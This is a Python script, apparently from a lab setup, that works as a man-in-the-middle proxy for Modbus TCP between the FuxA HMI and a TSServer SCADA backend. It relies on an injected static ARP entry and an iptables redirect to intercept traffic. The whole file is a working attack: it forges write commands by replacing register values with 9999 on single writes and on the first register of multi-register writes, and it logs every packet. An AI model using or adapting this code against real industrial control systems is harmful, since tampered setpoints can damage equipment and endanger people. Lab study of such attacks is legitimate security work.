#!/usr/bin/env python3
"""
SCADA MITM Proxy — Modbus TCP
Static ARP entry in FuxA redirects traffic here.
FuxA thinks it's talking to TSServer. It's not.
"""
import os, sys, socket, threading, subprocess

LISTEN_HOST   = "0.0.0.0"
LISTEN_PORT   = 5021          # same port FuxA is connecting to

TSSERVER_IP   = "172.20.0.2"  # real TSServer
TSSERVER_PORT = 5021          # confirmed working from your nc test

def setup_iptables():
    """
    Without this, the kernel sees dst=172.20.0.2 (not our IP)
    and tries to route/forward it instead of delivering locally.
    REDIRECT rewrites dst to 127.0.0.1 before routing decision.
    """
    subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
    subprocess.run([
        "iptables", "-t", "nat", "-A", "PREROUTING",
        "-p", "tcp", "--dport", "5021",
        "-j", "REDIRECT", "--to-ports", str(LISTEN_PORT)
    ], check=True)
    print("[+] iptables: PREROUTING :5021 → localhost:5021")

def teardown_iptables():
    subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
    print("[+] iptables cleared")

def inspect_and_forge(data: bytes, label: str) -> bytes:
    if label != "C→S" or len(data) < 8:
        return data

    fc = data[7]
    tid = int.from_bytes(data[0:2], 'big')   # Modbus transaction ID
    print(f"    [DPI] TxID:{tid} FC:{fc} (0x{fc:02X})")

    if fc == 0x06 and len(data) >= 12:
        addr = int.from_bytes(data[8:10],  'big')
        orig = int.from_bytes(data[10:12], 'big')
        print(f"    [FORGE] FC06 Write Single | Addr:{addr} | {orig} → 9999")
        return data[:10] + (9999).to_bytes(2, 'big') + data[12:]

    elif fc == 0x10 and len(data) >= 13:
        addr = int.from_bytes(data[8:10],  'big')
        qty  = int.from_bytes(data[10:12], 'big')
        bc   = data[12]
        print(f"    [FORGE] FC16 Write Multi  | Addr:{addr} | Qty:{qty}")
        if len(data) >= 13 + bc >= 2:
            orig = int.from_bytes(data[13:15], 'big')
            print(f"    [FORGE] First reg: {orig} → 9999")
            return data[:13] + (9999).to_bytes(2, 'big') + data[15:]

    elif fc in (0x01, 0x02, 0x03, 0x04):
        addr = int.from_bytes(data[8:10],  'big')
        qty  = int.from_bytes(data[10:12], 'big')
        print(f"    [PASS ] FC{fc:02X} Read | Addr:{addr} | Qty:{qty}")

    return data

def forward(src: socket.socket, dst: socket.socket, label: str):
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                print(f"  [{label}] closed by peer")
                break
            print(f"\n  [{label}] {len(chunk):4d}B  {chunk.hex()}")
            chunk = inspect_and_forge(chunk, label)
            dst.sendall(chunk)
    except Exception as e:
        print(f"  [{label}] {type(e).__name__}: {e}")
    finally:
        src.close()
        dst.close()

def handle(csock: socket.socket, addr):
    print(f"\n[+] Intercepted: {addr[0]}:{addr[1]}")
    backend = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    backend.settimeout(5)
    try:
        backend.connect((TSSERVER_IP, TSSERVER_PORT))
        backend.settimeout(None)
        print(f"[+] Tunnelled  → {TSSERVER_IP}:{TSSERVER_PORT}")
    except Exception as e:
        print(f"[-] TSServer unreachable: {e}")
        csock.close()
        return

    threading.Thread(target=forward, args=(csock,   backend, "C→S"), daemon=True).start()
    threading.Thread(target=forward, args=(backend, csock,   "S→C"), daemon=True).start()

def main():
    if os.geteuid() != 0:
        sys.exit("[-] Need root for iptables")

    print("=" * 55)
    print("  SCADA MITM  |  FuxA → [proxy] → TSServer")
    print(f"  Listen : 0.0.0.0:{LISTEN_PORT}")
    print(f"  Backend: {TSSERVER_IP}:{TSSERVER_PORT}")
    print("=" * 55)
    print("[!] Make sure static ARP is injected into FuxA first\n")

    setup_iptables()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(10)
    print(f"[*] Waiting on :{LISTEN_PORT} ...\n")

    try:
        while True:
            csock, addr = srv.accept()
            threading.Thread(target=handle, args=(csock, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        teardown_iptables()
        srv.close()

if __name__ == "__main__":
    main()